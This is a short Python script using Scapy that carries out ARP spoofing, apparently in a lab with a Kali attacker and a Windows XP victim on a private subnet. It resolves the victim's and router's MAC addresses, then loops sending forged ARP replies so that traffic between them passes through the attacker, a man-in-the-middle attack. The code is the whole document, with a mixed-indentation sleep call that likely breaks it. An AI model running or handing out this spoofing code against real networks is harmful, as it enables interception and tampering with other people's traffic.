#####################################################################
# This is python script to send ARP gratuitous reply packets		#
# to the router and the victim (XP machine), to link the MAC 		#
# address of the attacker (Kali machine) with the IP address		#
# of XP machine as well as the external router, so that all the		#
# packets exchanges between the router and XP are throught the 		#
# Kali, thus performing MITM attack.								#
#####################################################################

from scapy.all import *
from time import sleep
import os
import sys


def MAC_address(IP):
	#this function is used to get to know the MAC address associated with the IP address
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2)

	for send,receive in ans:
		return receive[Ether].src 		#this will return the source of IP i.e. MAC address

def main():
	router_IP = '10.10.111.1'			#IP address of external router
	XP_IP = '10.10.111.101'				#IP address of XP machine
	XP_MAC = MAC_address(XP_IP)			#MAC address of XP
	router_MAC = MAC_address(router_IP)	#MAC address of external router

	while(True):
		#op=2 is for sending the ARP gratuitous reply packets
		# the gratuitous ARP request packets are sent to XP machine
		send(ARP(op=2, psrc=router_IP, pdst=XP_IP, hwdst=XP_MAC))
		# the gratuitous ARP request packets are sent to router
		send(ARP(op=2, psrc=XP_IP, pdst=router_IP, hwdst=router_MAC)) 
        
        time.sleep(4)

if __name__=='__main__':
	main()

